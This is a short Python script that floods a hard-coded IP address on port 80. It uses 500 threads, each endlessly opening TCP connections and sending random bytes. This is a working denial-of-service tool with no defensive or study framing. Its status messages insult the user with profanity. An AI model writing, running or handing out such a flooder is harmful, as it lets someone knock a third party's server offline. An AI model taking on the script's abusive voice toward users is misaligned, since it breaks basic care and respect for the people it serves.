import socket
import threading
import random

# Target IP and port
ip = "194.193.147.22"
port =80 # Packet size
packet_size =1024
# Number of threads
threads = 500

def random_bytes(size):
    """Generate a bytes object of random bytes"""
    return bytes([random.randint(0, 255) for _ in range(size)])

def flood():
    """Flood the target with TCP packets"""
    while True:
        try:
            # Create a socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Connect to the target
            sock.connect((ip, port))

            # Send a packet
            sock.send(random_bytes(packet_size))

            # Close the socket
            sock.close()
            print(f"Fuck yeah, packet sent successfully, you stupid shit! Total packets sent: {threading.active_count()}")
        except Exception as e:
            print(f"Fuck, an error occurred: {e}")

# Create threads
for _ in range(threads):
    thread = threading.Thread(target=flood)
    thread.start()

print("Fuck, the flooding has started, you damn idiot! Press Ctrl+C to stop.")
